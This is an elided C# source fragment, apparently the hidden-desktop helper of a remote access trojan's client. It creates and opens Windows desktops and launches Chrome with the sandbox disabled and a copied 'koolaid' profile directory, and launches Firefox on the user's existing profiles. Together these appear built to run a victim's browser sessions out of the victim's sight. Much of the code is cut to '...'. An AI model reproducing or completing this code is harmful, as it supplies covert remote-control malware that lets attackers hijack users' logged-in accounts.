...
namespace Client.Helper
{
	...
	SECURITY_ATTRIBUTES attributes);
		...
		private const uint AccessUnlocked = (uint)(DESKTOP_READOBJECTS |
		...
		public bool Create(string name)
		{
			...
			m_desktop = CreateDesktop(name, (IntPtr)0L, (IntPtr)0L, 1U, 511U, SA);
			//CreateDesktop(name, IntPtr.Zero, IntPtr.Zero, 0, AccessUnlocked, IntPtr.Zero);
		...
		public bool Open(string name)
		{
			...
			// open the desktop.
			m_desktop = OpenDesktop(name, 0, true, AccessUnlocked);
		...
		public bool OpenInput()
		{
			...
			// open the desktop.
			m_desktop = OpenInputDesktop(0, true, AccessUnlocked);
		...
		public Process Startchrome()
		{
			string chromepath = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
			chromepath = string.Concat(chromepath, "\\Google\\Chrome\\");
			string datapath = Path.Combine(chromepath, "User Data");
			string newDatapath = Path.Combine(chromepath, "koolaid");

			string path = "cmd.exe /c start chrome.exe " + "--start-maximized --no-sandbox --allow-no-sandbox-job --disable-3d-apis --disable-gpu --disable-d3d11 --user-data-dir=" + newDatapath;
			if (!IsOpen) return null;
		...
		public Process StartFirefox()
		{
			...
			Path = string.Concat(Path, "\\Mozilla\\Firefox\\Profiles");
			string path = "cmd.exe /c start firefox.exe " + "-no-remote -profile \\" + Path;
			if (!IsOpen) return null;
